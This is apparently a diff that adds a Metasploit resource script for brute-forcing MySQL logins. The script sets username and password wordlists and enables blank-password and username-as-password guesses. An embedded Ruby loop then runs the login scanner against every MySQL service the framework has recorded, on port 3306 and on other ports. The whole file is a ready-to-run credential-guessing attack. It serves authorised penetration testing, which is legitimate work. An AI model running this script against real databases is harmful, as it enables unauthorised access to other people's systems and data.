@@ -1,0 +1,24 @@
+use auxiliary/scanner/mysql/mysql_login
+set USER_FILE /client/mysqlU
+set PASS_FILE /client/mysqlP
+set bruteforce_speed 4
+set blank_passwords true
+set user_as_pass true
+set VERBOSE true
+set THREADS 8
+ 
+<ruby>
+self.run_single("services -s mysql -u -p 3306 -R")
+self.run_single("set RPORT 3306")
+self.run_single("run")
+
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mysql" and service.state == "open" and service.port != 3306
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("run")
+    end
+  end
+end
+</ruby>
